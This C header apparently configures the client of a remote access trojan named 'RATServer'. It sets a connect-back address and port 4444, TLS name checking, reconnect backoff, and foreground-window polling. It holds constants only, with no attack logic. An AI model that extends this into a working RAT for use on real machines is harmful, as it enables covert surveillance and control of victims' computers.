#pragma once

// ── Server connection ──────────────────────────────────────────────────────
#define SERVER_ADDR         "127.0.0.1"
#define SERVER_PORT         4444

// ── TLS Key (CN verification) ─────────────────────────────────────────────
// Must match the TLS Key shown in the server's Listening tab.
// Empty string = skip verification (dev mode only).
#define EXPECTED_CN  "RATServer"

// ── Reconnect backoff (seconds) ────────────────────────────────────────────
#define RECONNECT_MIN_SEC   1
#define RECONNECT_MAX_SEC   30

// ── Timing ────────────────────────────────────────────────────────────────
// How often to poll the foreground window (ms)
#define UPDATE_INTERVAL_MS  500

// Drop connection if no PING received within this window
#define PING_TIMEOUT_MS     20000

// Per-recv OS-level timeout (prevents deadlock on partial reads)
#define RECV_TIMEOUT_MS     8000
